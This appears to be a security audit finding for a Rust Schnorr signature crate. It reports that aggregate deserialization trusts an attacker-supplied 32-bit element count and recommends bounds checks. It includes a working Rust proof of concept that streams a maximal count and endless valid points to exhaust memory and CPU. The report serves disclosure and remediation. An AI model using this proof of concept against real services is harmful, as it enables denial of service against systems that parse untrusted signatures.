### Title
Unbounded Schnorr aggregate deserialization enables attacker-controlled memory and CPU exhaustion - (File: crypto/schnorr/src/aggregate.rs)

### Summary

`SchnorrAggregate::read` accepts an attacker-controlled 32-bit signature count and loops up to `u32::MAX`, decoding one group element and appending it to an unbounded `Vec` on each iteration. [1](#0-0) 

### Finding Description

The function reads four bytes as `len` and then performs `u32::from_le_bytes(len)` iterations without enforcing a protocol-level maximum, checking that the input can plausibly contain that many elements, or bounding the resulting allocation. [2](#0-1) 

Each iteration calls `C::read_G`, which reads a complete encoded point, performs group decoding, and then performs an additional canonicality check by re-encoding and comparing the result. [3](#0-2) 

An input stream that continuously returns valid point encodings therefore causes the vector to grow to billions of entries while also forcing billions of point-decoding and canonicality-validation operations. [4](#0-3) 

### Impact Explanation

An unprivileged party able to submit serialized aggregate signatures can cause memory exhaustion, excessive CPU use, or process termination before parsing returns. [5](#0-4) 

The impact is not merely proportional to a short malicious message: the four-byte length field can claim up to 4,294,967,295 elements, while each accepted element is expanded into an in-memory `C::G` and processed through point decoding and canonical re-encoding. [6](#0-5) [3](#0-2) 

### Likelihood Explanation

`SchnorrAggregate::read` is a public deserialization API intended for data read from an arbitrary `Read` implementation, so callers which process signatures supplied by other participants can expose this path directly. [7](#0-6) 

No authentication, pre-existing shared state, invalid curve type, or protocol violation is needed beyond supplying a stream that begins with a large count and continues yielding valid canonical point encodings. [1](#0-0) 

### Recommendation

Enforce a context-appropriate maximum aggregate size before entering the loop. [1](#0-0) 

The reader should reject counts above the protocol’s maximum signer count and, where the serialized object is already buffered, reject lengths exceeding the number of complete fixed-size point encodings actually remaining. [6](#0-5) [8](#0-7) 

For streaming readers, use a bounded reader or a maximum element count rather than allowing the declared `u32` length alone to determine parsing work and memory growth. [1](#0-0) 

### Proof of Concept

```rust
// crypto/schnorr/src/aggregate.rs
use std::io::{self, Read};

use ciphersuite::{
  group::GroupEncoding,
  Ciphersuite,
};
use schnorr::SchnorrAggregate;

struct EndlessAggregate<C: Ciphersuite> {
  emitted: usize,
  point: <C::G as GroupEncoding>::Repr,
}

impl<C: Ciphersuite> EndlessAggregate<C> {
  fn new() -> Self {
    Self {
      emitted: 0,
      point: C::generator().to_bytes(),
    }
  }
}

impl<C: Ciphersuite> Read for EndlessAggregate<C> {
  fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
    let header = u32::MAX.to_le_bytes();

    for byte in out {
      *byte = if self.emitted < header.len() {
        header[self.emitted]
      } else {
        let point = self.point.as_ref();
        point[(self.emitted - header.len()) % point.len()]
      };
      self.emitted += 1;
    }

    Ok(out.len())
  }
}

fn exhaust<C: Ciphersuite>() {
  let mut stream = EndlessAggregate::<C>::new();

  // This attempts to deserialize u32::MAX points and does not return under
  // normal operation. The Rs Vec grows until memory is exhausted.
  let _ = SchnorrAggregate::<C>::read(&mut stream);
}
```

The proof reader supplies a `u32::MAX` element count followed by an endless repetition of the canonical generator encoding, causing the loop to call `C::read_G` and append to `Rs` indefinitely until process resources are exhausted. [5](#0-4)
